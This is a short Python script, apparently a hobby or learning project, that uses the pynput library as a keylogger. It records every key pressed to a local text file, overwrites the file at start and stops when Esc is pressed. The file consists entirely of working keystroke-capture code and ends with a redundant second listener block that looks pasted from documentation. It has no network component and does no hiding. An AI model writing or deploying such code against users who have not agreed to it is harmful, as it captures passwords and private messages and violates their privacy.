from pynput import keyboard

#names file
logs_file = "log_file.txt"
#specifies location of file
logs_file = "E:/Key_log/log_file.txt"

def press(key):
    try:
        #return/ save character entered into log file
        with open(logs_file, "a") as log:
            log.write('{0}'.format(key.char))
    except AttributeError:
        with open(logs_file, "a") as log:
            log.write('{0}'.format(key))

def release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

#create new file/ overwrites old file
with open(logs_file, "w") as log:
    log.write("")

with keyboard.Listener(
        on_press = press,
        on_release= release,
        suppress=True) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press= press,
    on_release= release,
    suppress= True)
listener.start()
